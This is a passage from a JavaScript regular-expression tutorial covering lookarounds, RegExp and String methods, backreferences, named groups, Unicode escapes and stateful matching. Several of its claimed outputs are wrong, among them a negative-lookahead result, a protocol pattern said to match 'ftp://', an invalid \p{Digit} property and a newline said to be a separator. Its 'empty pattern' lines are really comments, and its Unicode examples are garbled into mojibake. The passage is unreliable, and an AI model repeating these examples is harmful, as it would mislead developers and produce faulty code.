/(PNG|JPG|GIF)/.test('image.PNG');   // true
/(PNG|JPG|GIF)/.test('image.bmp');   // false

// Escaping in alternatives (no special meaning needed)
/hello|world|!/.test('!');       // true

// Longer to shorter (greedy matching)
/(is|isolate)/.exec('isolate');
// ['is', 'is'] (matches 'is' first)

/(isolate|is)/.exec('isolate');
// ['isolate', 'isolate'] (matches 'isolate')

// Real-world: file extensions
let imageFile = /\.(png|jpg|jpeg|gif|webp)$/i;
imageFile.test('photo.jpg');     // true
imageFile.test('photo.PNG');     // true
imageFile.test('photo.bmp');     // false

// Phone or email
let contactPattern = /\d{3}-\d{3}-\d{4}|[a-z]+@[a-z]+\.[a-z]+/i;
contactPattern.test('555-123-4567');       // true
contactPattern.test('user@example.com');   // true

// Protocols
let protocol = /^https?:\/\/(ftp:\/\/)?/;
protocol.test('https://');       // true
protocol.test('ftp://');         // true

// Time format (12 or 24 hour)
let time = /\d{1,2}:\d{2}(AM|PM)?/;
time.test('3:30PM');             // true
time.test('15:30');              // true

// Non-capturing alternation
/(?:cat|dog)/.exec('cat');
// ['cat'] (no capturing group)

// Mixed with other patterns
/^(start|begin) \w+/.test('start action');  // true
```

---

### 9.2.8 Lookahead and Lookbehind

**Lookahead and lookbehind** assert what comes before/after without consuming characters.

```javascript
// Positive lookahead: (?=pattern)
/\d+(?=px)/.exec('24px');        // ['24'] (digit followed by 'px')
/\d+(?=px)/.exec('24');          // null (no 'px' after)

// Negative lookahead: (?!pattern)
/\d+(?!px)/.exec('24');          // ['24'] (not followed by 'px')
/\d+(?!px)/.exec('24px');        // null (is followed by 'px')

// Positive lookbehind: (?<=pattern)
/(?<=\$)\d+/.exec('$50');        // ['50'] (preceded by $)
/(?<=\$)\d+/.exec('50');         // null (not preceded by $)

// Negative lookbehind: (?<!\$)
/(?<!\$)\d+/.exec('50');         // ['50'] (not preceded by $)
/(?<!\$)\d+/.exec('$50');        // null (is preceded by $)

// Combining lookahead and lookbehind
/(?<=\$)(\d+)(?=px)/.exec('$50px');  // ['50', '50']

// Real-world: extract number from price
let price = '$19.99';
/(?<=\$)[\d.]+/.exec(price)[0];  // '19.99'

// Password validation: must contain digit
/(?=.*\d)/.test('password');     // false
/(?=.*\d)/.test('password1');    // true

// Username not starting with underscore
/(?<!_)[a-z]+/.exec('_username');  // ['sername'] (starts at non-underscore)
/(?<!_)[a-z]+/.exec('username');   // ['username']

// Find word boundaries
/(?<=\s)\w+/.exec('hello world'); // ['world'] (after space)
/\w+(?=\s)/.exec('hello world');  // ['hello'] (before space)

// Complex password validation
let password = 'MyPass123!';
let hasUpper = /(?=.*[A-Z])/.test(password);      // true
let hasLower = /(?=.*[a-z])/.test(password);      // true
let hasDigit = /(?=.*\d)/.test(password);         // true
let hasSpecial = /(?=.*[!@#$%])/.test(password);  // true
let isLongEnough = /.{8,}/.test(password);        // true

// All conditions in one pattern
let strongPassword = /^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[!@#$%]).{8,}$/;
strongPassword.test(password);   // true

// Matching but not consuming
/foo(?=bar)/.exec('foobar');     // ['foo'] (bar not included)
/(?<=foo)bar/.exec('foobar');    // ['bar'] (foo not included)

// URL protocol not http
/https?(?=:\/\/)/.exec('https://');  // ['https']
/(?<!:)\/\//.exec('example.com://'); // No match
/(?<!:)\/\//.exec('example.com//');  // ['//']

// Variable-width lookbehind (not all engines support)
// /(?<=\$\d{1,3})/.test('$123'); // May not work in all browsers
```

---

## Summary: Pattern Syntax

**Key Takeaways:**

1. **Literal characters** match exactly; special chars need `\` escaping
2. **Character classes** `[abc]` match any one character; `[^abc]` negates
3. **Predefined classes**: `\d` (digit), `\w` (word), `\s` (space), `.` (any)
4. **Quantifiers**: `*` (0+), `+` (1+), `?` (0-1), `{n,m}` (range)
5. **Anchors**: `^` (start), `$` (end), `\b` (boundary)
6. **Groups**: `()` captures, `(?:)` non-captures, `(?<name>)` named captures
7. **Alternation**: `|` matches one or other pattern
8. **Lookahead/Lookbehind**: Assert without consuming: `(?=)`, `(?!)`, `(?<=)`, `(?<!)`

**Common Validation Patterns:**
- Email: `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`
- URL: `/^https?:\/\/.+$/`
- Phone: `/^\d{3}-?\d{3}-?\d{4}$/`
- Strong password: `/^(?=.*[A-Z])(?=.*[a-z])(?=.*\d).{8,}$/`
- IP address: `/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/`

**Best Practices:**
- Use character classes `[a-z]` instead of alternation `a|b|c`
- Use non-capturing `(?:)` when you don't need the match
- Use lookahead `(?=...)` for assertions without consuming
- Test patterns thoroughly with edge cases
## 9.3 RegExp Methods

**RegExp methods** and **String methods for regex** perform matching, searching, and replacing operations.

---

### 9.3.1 RegExp.prototype.test()

**test()** returns a boolean indicating whether a pattern matches.

```javascript
// Basic test
let regex = /hello/;
regex.test('hello world');       // true
regex.test('goodbye');           // false

// Returns true/false, not the match
let result = regex.test('hello');
typeof result;                   // 'boolean'

// Case-sensitive by default
/hello/.test('HELLO');           // false
/hello/i.test('HELLO');          // true

// Returns true on first match (with global flag)
let globalRegex = /o/g;
globalRegex.test('foo');         // true (found first 'o')
globalRegex.test('foo');         // true (found second 'o')
globalRegex.test('foo');         // false (no more 'o')
globalRegex.lastIndex;           // 0 (reset after final failure)

// test() with stateful regex (global/sticky)
let pattern = /\d+/g;
pattern.test('a1b2c3');          // true
pattern.lastIndex;               // 2

pattern.test('a1b2c3');          // true (continues from lastIndex)
pattern.lastIndex;               // 4

// Resetting for re-test
pattern.lastIndex = 0;
pattern.test('a1b2c3');          // true (starts over)

// Common use cases
if (/^[a-z]+$/.test(input)) {
  console.log('Valid: lowercase only');
}

let isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
let isUrl = /^https?:\/\/.+$/.test(url);

// Empty pattern matches everything
//.test('anything');              // true
//.test('');                      // true

// Common patterns
/\d/.test('5');                  // true
/\w/.test('a');                  // true
/\s/.test(' ');                  // true

// Performance: test() is fastest check
if (/pattern/.test(string)) {
  // Do something
}
// Faster than: string.includes() if pattern complex
// Equivalent to: string.match(/pattern/) !== null

// Pattern compilation
let emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
function validateEmail(email) {
  return emailPattern.test(email);
}

validateEmail('user@example.com');  // true
validateEmail('invalid');           // false
```

---

### 9.3.2 RegExp.prototype.exec()

**exec()** returns match details including captured groups or null.

```javascript
// Basic exec
let regex = /hello/;
let result = regex.exec('hello world');
result;                          // ['hello']
result[0];                       // 'hello' (full match)
result.index;                    // 0 (position)
result.input;                    // 'hello world' (original string)

// Returns null if no match
regex.exec('goodbye');           // null

// With groups
let pattern = /(\d{3})-(\d{4})/;
let match = pattern.exec('phone: 555-1234');
match[0];                        // '555-1234' (full match)
match[1];                        // '555' (first group)
match[2];                        // '1234' (second group)
match.index;                     // 7 (position in string)

// With named groups
let namedPattern = /(?<area>\d{3})-(?<line>\d{4})/;
let namedMatch = namedPattern.exec('555-1234');
namedMatch.groups.area;          // '555'
namedMatch.groups.line;          // '1234'

// Global regex: maintains lastIndex
let globalRegex = /\w+/g;
let first = globalRegex.exec('hello world');
first[0];                        // 'hello'
globalRegex.lastIndex;           // 5

let second = globalRegex.exec('hello world');
second[0];                       // 'world'
globalRegex.lastIndex;           // 11

let third = globalRegex.exec('hello world');
third;                           // null (no more matches)
globalRegex.lastIndex;           // 0 (reset)

// Finding all matches in loop
let regex2 = /\d+/g;
let match2;
let allMatches = [];
while ((match2 = regex2.exec('a1b22c333')) !== null) {
  allMatches.push(match2[0]);
}
allMatches;                      // ['1', '22', '333']

// Sticky regex: only matches at lastIndex
let sticky = /\d+/y;
sticky.lastIndex = 1;
sticky.exec('a1b2c3');           // ['1']

sticky.lastIndex = 0;
sticky.exec('a1b2c3');           // null (no digit at position 0)

// Match object properties
let ex = /(\w+)@(\w+)/.exec('user@example');
ex.length;                       // 3 (full match + 2 groups)
ex.index;                        // 0 (start position)
ex.input;                        // 'user@example'
ex.groups;                       // undefined (no named groups)

// Using exec for validation with details
function parseEmail(email) {
  let pattern = /^([^@]+)@([^@]+)$/;
  let match = pattern.exec(email);
  if (match) {
    return { username: match[1], domain: match[2] };
  }
  return null;
}

parseEmail('user@example.com');
// { username: 'user', domain: 'example.com' }

// Finding match position
function findPattern(string, pattern) {
  let regex = new RegExp(pattern);
  let match = regex.exec(string);
  if (match) {
    return { found: true, index: match.index, match: match[0] };
  }
  return { found: false };
}

// Loop pattern: get all matches with positions
function findAllMatches(string, pattern, flags = 'g') {
  let regex = new RegExp(pattern, flags);
  let match;
  let results = [];
  while ((match = regex.exec(string)) !== null) {
    results.push({ text: match[0], index: match.index });
  }
  return results;
}

findAllMatches('hello 123 world 456', '\\d+');
// [
//   { text: '123', index: 6 },
//   { text: '456', index: 18 }
// ]
```

---

### 9.3.3 String Methods with RegExp

**String methods** perform regex operations on strings.

```javascript
// match() - returns all matches (like exec with /g)
let text = 'hello world hello';
text.match(/hello/);             // ['hello'] (first match)
text.match(/hello/g);            // ['hello', 'hello'] (all matches)
text.match(/xyz/);               // null (no match)

// With groups
let pattern = /(\w+)@(\w+)/g;
text.match(pattern);             // ['user@example', ...] (full matches only)

// matchAll() - returns iterator with all details
let regex = /(\w+)@(\w+)/g;
let matches = [...text.matchAll(regex)];
matches.forEach(match => {
  console.log(match[0], match.index);  // Full match and position
});

// search() - returns index of first match
let str = 'hello world';
str.search(/o/);                 // 4 (position of first 'o')
str.search(/x/);                 // -1 (not found)

// Works with regex but not string patterns
str.search(/world/);             // 6
str.search('world');             // 6 (coerced to regex)

// replace() - replace first or all (with /g)
let replaced = 'hello world'.replace(/o/, 'O');
replaced;                        // 'hellO world' (first only)

let replaceAll = 'hello world'.replace(/o/g, 'O');
replaceAll;                      // 'hellO wOrld' (all)

// replaceAll() - ES2021, only replaces all
'hello world'.replaceAll('o', 'O');  // 'hellO wOrld'

// Replace with function
'hello world'.replace(/\w+/g, (match) => {
  return match.toUpperCase();
});
// 'HELLO WORLD'

// Replace function with groups
'555-1234'.replace(/(\d{3})-(\d{4})/, '($1) $2');
// '(555) 1234'

// Split with regex
let csv = 'apple,banana;cherry|date';
csv.split(/[,;|]/);              // ['apple', 'banana', 'cherry', 'date']

// Keep delimiters with capturing group
'hello123world456'.split(/(\d+)/);
// ['hello', '123', 'world', '456', '']

// Case-insensitive operations
let text2 = 'Hello WORLD';
text2.match(/hello/i);           // ['Hello']
text2.search(/world/i);          // 6
text2.replace(/hello/i, 'Hi');   // 'Hi WORLD'

// Real-world: highlight search results
function highlightMatches(text, keyword) {
  let regex = new RegExp(`\\b${keyword}\\b`, 'gi');
  return text.replace(regex, (match) => `<mark>${match}</mark>`);
}

// Real-world: extract URLs
function extractUrls(text) {
  let regex = /https?:\/\/[^\s]+/g;
  return text.match(regex) || [];
}

// Real-world: validate and format phone
function formatPhone(phone) {
  let digits = phone.replace(/\D/g, '');
  return digits.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
}

formatPhone('5551234567');       // '(555) 123-4567'

// Combining multiple operations
let email = 'USER@EXAMPLE.COM';
let processed = email
  .toLowerCase()
  .replace(/\s+/g, '')           // Remove spaces
  .match(/^[^\s@]+@[^\s@]+$/);   // Validate format

// includes() is faster for simple substring
'hello world'.includes('world');  // true (faster than regex)
/world/.test('hello world');     // true (slower)

// Performance: cached regex patterns
const DIGIT = /\d/;
const WORD = /\w+/g;
const WHITESPACE = /\s+/;

// Use cached patterns for repeated operations
for (let item of items) {
  WORD.lastIndex = 0;            // Reset for reuse
  let words = item.match(WORD);
}

// Match with position information
function findAllPositions(text, regex) {
  let match;
  let positions = [];
  if (!regex.global) {
    regex = new RegExp(regex.source, regex.flags + 'g');
  }
  while ((match = regex.exec(text)) !== null) {
    positions.push({
      text: match[0],
      start: match.index,
      end: match.index + match[0].length
    });
  }
  return positions;
}

findAllPositions('hello world hello', /\w+/);
// [
//   { text: 'hello', start: 0, end: 5 },
//   { text: 'world', start: 6, end: 11 },
//   { text: 'hello', start: 12, end: 17 }
// ]
```

---

## Summary: RegExp Methods

**Key Takeaways:**

1. **test()** - Returns boolean (true/false), use for existence checks
2. **exec()** - Returns match details with groups, index, and input
3. **String.match()** - Returns all matches; null if none
4. **String.matchAll()** - Returns iterator with full details for each match
5. **String.search()** - Returns index of first match or -1
6. **String.replace()** - Replaces first match or all (with /g)
7. **String.split()** - Splits string by regex pattern

**Method Selection Guide:**

| Need | Method |
|------|--------|
| Check if matches | `regex.test()` or `string.includes()` |
| Get first match | `regex.exec()` or `string.match()` |
| Get all matches | `string.match(/g)` or `string.matchAll()` |
| Get match position | `regex.exec()` with `.index` |
| Find index | `string.search()` |
| Replace text | `string.replace()` or `string.replaceAll()` |
| Split string | `string.split(/pattern/)` |

**Performance Tips:**
- Cache regex patterns for reuse
- Use simple methods first: `includes()`, `startsWith()`, `endsWith()`
- Use `test()` for boolean checks (fastest)
- Use `search()` for first position only
- Use `match(/g)` or `matchAll()` for all matches
- Reset `lastIndex` when reusing global regex

**Common Patterns Reference:**
```javascript
const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const URL = /^https?:\/\/.+$/;
const PHONE = /^\d{3}-?\d{3}-?\d{4}$/;
const DIGITS = /\d+/g;
const WORDS = /\w+/g;
const SPACES = /\s+/;
```
## 9.4 Advanced RegExp

**Advanced techniques** for mastering complex regex patterns and special features.

---

### 9.4.1 Backreferences

**Backreferences** allow referencing previously captured groups within a pattern.

```javascript
// Numbered backreference: \1, \2, etc.
// Match repeated characters
/(\w)\1/.test('hello');          // true ('l' repeated)
/(\w)\1/.test('hi');             // false (no repeats)

// Find word with doubled letter
/(\w)\1\w*/.exec('hello');       // ['ello'] (double 'l' found)

// Match HTML tags with same opening and closing
/<(\w+)>.*?<\/\1>/.test('<div>content</div>');  // true
/<(\w+)>.*?<\/\1>/.test('<div>content</span>'); // false

// Three-digit backreference
/(a)(b)(c)\3\2\1/.test('abccba');  // true (c, b, a in reverse)

// Multiple backreferences
/(\w+)\s(\w+)\2\s\1/.test('hello world world hello');  // true

// Using backreferences in replace
// Swap two words
'hello world'.replace(/(\w+)\s(\w+)/, '$2 $1');  // 'world hello'

// Double-up repeated characters
'hello'.replace(/(\w)\1/, '$1$1$1');  // 'helllo' (if had 'l' repeated)

// Format transformation
'2024-02-08'.replace(/(\d{4})-(\d{2})-(\d{2})/, '$3/$2/$1');
// '08/02/2024'

// Find repeated words
let repeatedWords = /\b(\w+)\s+\1\b/;
repeatedWords.test('the the');   // true
repeatedWords.test('the quick'); // false

// Remove duplicate words
'the the quick brown brown fox'.replace(/\b(\w+)\s+\1\b/g, '$1');
// 'the quick brown fox'

// Match pattern with backreference
/(.)(.)\2\1/.test('abba');       // true
/(.)(.)\2\1/.test('abcd');       // false

// Real-world: validate matching quotes
/"([^"]*)"|\{([^}]*)\}/.test('"hello"');  // true
/"([^"]*)"|\{([^}]*)\}/.test('{hello}');  // true

// Complex pattern: HTML with matching tags
function validateHTML(html) {
  return /<(\w+)[^>]*>.*?<\/\1>/.test(html);
}

validateHTML('<div class="box">content</div>');  // true

// Finding all repeated words
function findRepeatedWords(text) {
  let regex = /\b(\w+)\s+\1\b/gi;
  return text.match(regex) || [];
}

findRepeatedWords('the the dog dog bird');
// ['the the', 'dog dog']

// Case-insensitive backreference (needs group capture)
/([a-z]+):\s*\1/i.test('hello: HELLO');  // true

// Match quoted strings (any quote type)
/(['"]).*?\1/.test("'hello'");   // true
/(['"]).*?\1/.test('"hello"');   // true
/(['"]).*?\1/.test('"hello\'');  // false (mismatched)

// Multiple levels of backreferences
let nestPattern = /(\[)(\d+)(\1)(\2)/;
nestPattern.test('[[1]1');       // false
nestPattern.test('[1[[1]1');     // false (complex)

// Using backreference in lookahead (advanced)
/(\w+).*(?=\1)/.test('hello...hello');  // true

// Replace with backreference and function
'hello world'.replace(/(hello)|(world)/, (match, g1, g2) => {
  return g1 ? 'hi' : 'earth';    // 'hi world'
});
```

---

### 9.4.2 Named Capture Groups

**Named capture groups** make patterns more readable by naming groups.

```javascript
// Named group: (?<name>...)
let datePattern = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
let match = '2024-02-08'.match(datePattern);

// Access by name
match.groups.year;               // '2024'
match.groups.month;              // '02'
match.groups.day;                // '08'

// Also accessible by index
match[1];                        // '2024' (year)
match[2];                        // '02' (month)
match[3];                        // '08' (day)

// Multiple named groups
let emailPattern = /(?<user>[^@]+)@(?<domain>[^.]+)\.(?<tld>.+)/;
let email = 'john.doe@example.com'.match(emailPattern);
email.groups.user;               // 'john.doe'
email.groups.domain;             // 'example'
email.groups.tld;                // 'com'

// Using named groups in replace
let text = 'John: 25, Alice: 30';
let personPattern = /(?<name>\w+):\s*(?<age>\d+)/g;

text.replace(personPattern, '$<name> is $<age> years old');
// 'John is 25 years old, Alice is 30 years old'

// Named and unnamed groups mixed
let urlPattern = /^(?<protocol>https?):\/{2}(\w+)\.(?<domain>.+)$/;
let url = 'https://www.example.com'.match(urlPattern);
url.groups.protocol;             // 'https'
url.groups.domain;               // 'example.com'
url[2];                          // 'www' (unnamed group)

// Backreference with named groups
// Match repeated words (using named reference)
let repeatedPattern = /\b(?<word>\w+)\s+\k<word>\b/i;
repeatedPattern.test('hello hello');  // true
repeatedPattern.test('hello HELLO');  // true

// Parse person information with names
let personData = 'name: Alice, age: 30, city: NYC';
let personPattern = /(?<key>\w+):\s*(?<value>[^,}]+)/g;
let people = [...personData.matchAll(personPattern)];

people.forEach(match => {
  console.log(`${match.groups.key}: ${match.groups.value}`);
});
// Output:
// name: Alice
// age: 30
// city: NYC

// Complex parsing with named groups
let logPattern = /\[(?<time>\d{2}:\d{2}:\d{2})\]\s(?<level>\w+):\s(?<message>.*)/;
let log = '[14:30:45] ERROR: Database connection failed';
let parsed = log.match(logPattern);

parsed.groups.time;              // '14:30:45'
parsed.groups.level;             // 'ERROR'
parsed.groups.message;           // 'Database connection failed'

// Function receiving named groups
function processMatch(text) {
  let pattern = /(?<method>\w+)\s(?<url>.+)\s(?<status>\d+)/;
  let match = text.match(pattern);
  if (match) {
    return {
      method: match.groups.method,
      url: match.groups.url,
      status: parseInt(match.groups.status)
    };
  }
}

processMatch('GET /api/users 200');
// { method: 'GET', url: '/api/users', status: 200 }

// Optional named groups
let optionalPattern = /(?<first>\w+)(?:\s(?<last>\w+))?/;
'Alice'.match(optionalPattern).groups;     // { first: 'Alice', last: undefined }
'Alice Bob'.match(optionalPattern).groups; // { first: 'Alice', last: 'Bob' }

// Named group with multiple captures (last wins)
let multiCapture = /(?<digits>\d)+/;
let result = 'abc123def'.match(multiCapture);
result.groups.digits;            // '3' (last digit captured)

// Destructuring named groups
let { groups: { year, month, day } } = 
  '2024-02-08'.match(/(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/);

console.log(`${day}/${month}/${year}`);  // '08/02/2024'

// Real-world: Parse CSV with headers
function parseCSV(headerLine, dataLine) {
  let headers = headerLine.split(',').map(h => h.trim());
  let pattern = new RegExp(
    '(' + headers.map(h => `(?<${h}>[^,]+)`).join('|') + ')',
    'g'
  );
  // Complex to construct; simpler to split and assign
  let values = dataLine.split(',').map(v => v.trim());
  return Object.fromEntries(headers.map((h, i) => [h, values[i]]));
}

parseCSV('name,age,city', 'Alice,30,NYC');
// { name: 'Alice', age: '30', city: 'NYC' }
```

---

### 9.4.3 Unicode and Property Escapes

**Unicode support** and **property escapes** for international text.

```javascript
// Unicode flag: 'u'
// Treats regex as Unicode sequences
/./u.test('ðŸ˜€');                 // true (matches emoji)
/./. test('ðŸ˜€');                 // false (without flag, matches half)

// Length with Unicode flag
'ðŸ˜€'.length;                     // 2 (UTF-16 code units)
[...'ðŸ˜€'].length;                // 1 (actual character)

// Unicode character class
/\p{Letter}/u.test('A');         // true
/\p{Letter}/u.test('Î±');         // true (Greek)
/\p{Letter}/u.test('ä¸­');        // true (Chinese)
/\p{Letter}/u.test('5');         // false

// Unicode digit class
/\p{Digit}/u.test('5');          // true
/\p{Digit}/u.test('Ù¥');          // true (Arabic 5)
/\p{Digit}/u.test('äº”');         // false (Chinese character, not digit)

// Unicode number class
/\p{Number}/u.test('5');         // true
/\p{Number}/u.test('Â½');         // true (fraction)
/\p{Number}/u.test('â…«');         // true (Roman numeral)

// Negated Unicode property
/\P{Letter}/u.test('5');         // true (not a letter)
/\P{Letter}/u.test('A');         // false (is a letter)

// Case properties
/\p{Uppercase}/u.test('A');      // true
/\p{Uppercase}/u.test('a');      // false

/\p{Lowercase}/u.test('a');      // true
/\p{Lowercase}/u.test('A');      // false

// Punctuation
/\p{Punctuation}/u.test('.');    // true
/\p{Punctuation}/u.test('!');    // true
/\p{Punctuation}/u.test('a');    // false

// Symbol
/\p{Symbol}/u.test('$');         // true
/\p{Symbol}/u.test('â‚¬');         // true
/\p{Symbol}/u.test('Â©');         // true
/\p{Symbol}/u.test('a');         // false

// Separator
/\p{Separator}/u.test(' ');      // true
/\p{Separator}/u.test('\n');     // true
/\p{Separator}/u.test('a');      // false

// Script property (requires special syntax in older engines)
/\p{Script=Latin}/u.test('Hello');     // true
/\p{Script=Greek}/u.test('Î“ÎµÎ¹Î±');      // true
/\p{Script=Han}/u.test('ä½ å¥½');        // true

// Common Unicode patterns
let word = /\p{Letter}+/u;
word.test('Hello');              // true
word.test('Ù…Ø±Ø­Ø¨Ø§');              // true (Arabic)

let number = /\p{Number}+/u;
number.test('123');              // true
number.test('Ù¡Ù¢Ù£');              // true (Arabic numerals)

// Validate international email (simplified)
let intlEmail = /^[\p{Letter}\p{Number}._%-]+@[\p{Letter}\p{Number}.-]+$/u;
intlEmail.test('ç”¨æˆ·@ä¾‹ãˆ.jp');   // true (Japanese domains)

// Emoji detection
/\p{Emoji}/u.test('ðŸ˜€');         // true (if supported)
/\p{Emoji}/u.test('ðŸŽ‰');         // true

// Character categories
/\p{General_Category=Punctuation}/u.test('.');  // true
/\p{General_Category=Letter}/u.test('A');       // true

// Combining characters (diacritics)
let accented = 'e\u0301';       // Ã© (e + combining acute)
/\p{Mark}/u.test(accented[1]);  // true (combining mark)

// Escape Unicode sequences
/\u0041/.test('A');              // true (code unit)
/\u{1F600}/.test('ðŸ˜€');          // true (full code point with flag)

// Text normalization for comparison
let s1 = 'cafÃ©';                 // Ã© as single character
let s2 = 'cafÃ©';                 // e + combining acute
s1 === s2;                       // false (different representations)
s1.normalize() === s2.normalize();  // true (normalized)

// Match any script except Latin
/[^\p{Script=Latin}]/u.test('123');  // false (numbers are neutral)
/[^\p{Script=Latin}]/u.test('cafÃ©'); // false (Latin)
/[^\p{Script=Latin}]/u.test('ä½ å¥½'); // true (Han script)

// Real-world: validate international phone
function isValidPhone(phone) {
  let pattern = /^\+?[\p{Digit}\s\-()]+$/u;
  return pattern.test(phone);
}

isValidPhone('+1 (555) 123-4567');  // true
isValidPhone('+44 7911 123456');    // true
```

---

### 9.4.4 lastIndex and Stateful Regex

**lastIndex** property maintains state for global and sticky regex.

```javascript
// Global regex: lastIndex persists across exec/test calls
let regex = /\d+/g;
regex.lastIndex;                 // 0 (initial)

regex.exec('a1b2c3');           // ['1']
regex.lastIndex;                // 2 (after match)

regex.exec('a1b2c3');           // ['2']
regex.lastIndex;                // 4

regex.exec('a1b2c3');           // ['3']
regex.lastIndex;                // 6

regex.exec('a1b2c3');           // null (no more)
regex.lastIndex;                // 0 (reset after failure)

// Important: String methods don't modify lastIndex
let regex2 = /\d+/g;
'a1b2c3'.match(regex2);          // ['1', '2', '3']
regex2.lastIndex;                // 0 (unchanged)

// Sticky flag: must match at lastIndex position
let sticky = /\d+/y;
sticky.exec('a1b2c3');           // null (no digit at position 0)

sticky.lastIndex = 1;
sticky.exec('a1b2c3');           // ['1']
sticky.lastIndex;                // 2

sticky.exec('a1b2c3');           // ['2']
sticky.lastIndex;                // 4

sticky.exec('a1b2c3');           // ['3']
sticky.lastIndex;                // 6

// Difference: global allows skipping, sticky doesn't
let globalRegex = /\d+/g;
let stickyRegex = /\d+/y;

globalRegex.exec('a  1b  2');    // ['1']
globalRegex.exec('a  1b  2');    // ['2'] (skipped spaces)

stickyRegex.lastIndex = 0;
stickyRegex.exec('a  1b  2');    // null (no digit at 0)

stickyRegex.lastIndex = 3;
stickyRegex.exec('a  1b  2');    // ['1']

// Token parsing with sticky
function tokenize(input) {
  let tokens = [];
  let regex = /(\d+|\+|-|\*|\/)/y;
  
  while (regex.lastIndex < input.length) {
    let match = regex.exec(input);
    if (!match) break;
    tokens.push(match[1]);
  }
  return tokens;
}

tokenize('12+34*5');             // ['12', '+', '34', '*', '5']

// Resetting lastIndex for reuse
let regex3 = /\d+/g;
function getAllNumbers(str) {
  regex3.lastIndex = 0;          // Reset before use
  return str.match(regex3);
}

getAllNumbers('a1b2');           // ['1', '2']
getAllNumbers('x9y8');           // ['9', '8']

// Manual iteration for complex logic
let regex4 = /\w+/g;
let match;
let words = [];

while ((match = regex4.exec('hello world')) !== null) {
  words.push({
    text: match[0],
    position: match.index,
    length: match[0].length
  });
}

words;
// [
//   { text: 'hello', position: 0, length: 5 },
//   { text: 'world', position: 6, length: 5 }
// ]

// Alternating between regex objects
let regex5 = /\d+/g;
let regex6 = /\w+/g;

regex5.exec('a1b2');             // ['1']
regex5.exec('a1b2');             // ['2'] (continues from last)

regex6.exec('a1b2');             // ['a'] (independent)
regex6.exec('a1b2');             // ['1'] (continues)

// lastIndex doesn't reset when pattern changes
let pattern = /\d/g;
pattern.lastIndex = 10;
pattern = /\w/g;                 // New regex, different lastIndex
pattern.lastIndex;               // 0

// Preserving lastIndex for re-entry
function findNextMatch(regex, string, startFrom = 0) {
  regex.lastIndex = startFrom;
  let match = regex.exec(string);
  return { match, nextIndex: regex.lastIndex };
}

let result1 = findNextMatch(/\d+/g, 'a1b2c3', 0);
let result2 = findNextMatch(/\d+/g, 'a1b2c3', result1.nextIndex);
// result1.match[0] = '1', nextIndex = 2
// result2.match[0] = '2', nextIndex = 4
```

---

### 9.4.5 Match Indices (d flag)

**Match indices** ('d' flag) provides start and end positions of matches and groups.

```javascript
// 'd' flag: provides indices array
let regex = /(\d{3})-(\d{4})/d;
let match = 'call 555-1234'.match(regex);

match[0];                        // '555-1234'
match.indices[0];                // [5, 12] (start, end of full match)
match.indices[1];                // [5, 8] (start, end of group 1: '555')
match.indices[2];                // [9, 12] (start, end of group 2: '1234')

// With global flag
let globalMatch = 'a1b2c3'.match(/(\d+)/gd);
globalMatch.forEach(match => {
  console.log(`${match[0]} at ${match.indices[0]}`);
});
// Output:
// 1 at 1,2
// 2 at 3,4
// 3 at 5,6

// Named groups with indices
let namedPattern = /(?<year>\d{4})-(?<month>\d{2})/d;
let dateMatch = '2024-02'.match(namedPattern);

dateMatch.groups.year;                    // '2024'
dateMatch.indices.groups.year;            // [0, 4]
dateMatch.indices.groups.month;           // [5, 7]

// Finding exact positions in text
function highlightMatches(text, pattern) {
  let matches = text.match(new RegExp(pattern, 'gd'));
  return matches.map(m => ({
    text: m[0],
    start: m.indices[0][0],
    end: m.indices[0][1]
  }));
}

highlightMatches('The year 2024 and 2025', '\\d+');
// [
//   { text: '2024', start: 9, end: 13 },
//   { text: '2025', start: 18, end: 22 }
// ]

// Replacing with position awareness
function replaceAtPositions(text, pattern, replacer) {
  let matches = text.match(new RegExp(pattern, 'gd'));
  let result = '';
  let lastIndex = 0;
  
  matches.forEach(match => {
    let [start, end] = match.indices[0];
    result += text.slice(lastIndex, start);
    result += replacer(match[0], match.indices);
    lastIndex = end;
  });
  
  result += text.slice(lastIndex);
  return result;
}

// Validate HTML structure
function checkHTMLTags(html) {
  let tags = html.match(/<(\w+)[^>]*>|<\/(\w+)>/gd);
  let stack = [];
  
  tags.forEach(tag => {
    let [start, end] = tag.indices[0];
    let isClose = tag.includes('</');
    let tagName = tag.match(/\w+/)[0];
    
    if (isClose) {
      if (stack[stack.length - 1] !== tagName) {
        console.log(`Mismatch at ${start}: expected </${stack[stack.length - 1]}>, got </${tagName}>`);
      } else {
        stack.pop();
      }
    } else {
      stack.push(tagName);
    }
  });
}

checkHTMLTags('<div><p>text</p></div>');  // Valid
checkHTMLTags('<div><p>text</div></p>');  // Mismatch detected
```

---

## Summary: Advanced RegExp

**Key Takeaways:**

1. **Backreferences** `\1`, `\2` - Match previously captured groups
2. **Named groups** `(?<name>...)` - Reference groups by name for clarity
3. **Unicode support** `\p{...}` with 'u' flag - Match international text
4. **lastIndex property** - Tracks position in global/sticky regex
5. **Sticky flag** 'y' - Must match at exact position
6. **Match indices** 'd' flag - Get start/end positions of matches

**When to Use:**

| Feature | Use Case |
|---------|----------|
| Backreferences | Match repeated patterns, validate matching tags |
| Named groups | Complex patterns, improved readability |
| Unicode escapes | International text, emoji, multilingual |
| lastIndex | Token parsing, stateful matching |
| Sticky flag | Tokenization, mandatory position matching |
| Match indices | Precise text replacement, syntax highlighting |

**Performance Considerations:**
- Backreferences can be slow (backtracking)
- Unicode flag adds overhead; use only when needed
- Cache compiled regex patterns
- Sticky regex faster for sequential parsing
- Match indices 'd' flag adds memory overhead

**Common Advanced Patterns:**
```javascript
// Email with international domain
/^[\p{Letter}\p{Number}._%-]+@[\p{Letter}\p{Number}.-]+$/u

// Token parsing
let tokens = [];
let tokenRegex = /(\d+|[+\-*/])/y;

// HTML tag matching
/<(\w+)[^>]*>.*?<\/\1>/

// Repeated word detection
/\b(\w+)\s+\1\b/i
```

---

## Common Pitfalls

### Pitfall 1: Forgetting to Escape Special Characters

```javascript
// âŒ WRONG: Dot matches ANY character
const regex = /192.168.1.1/;
console.log(regex.test('192X168Y1Z1'));  // true! Dots match X, Y, Z

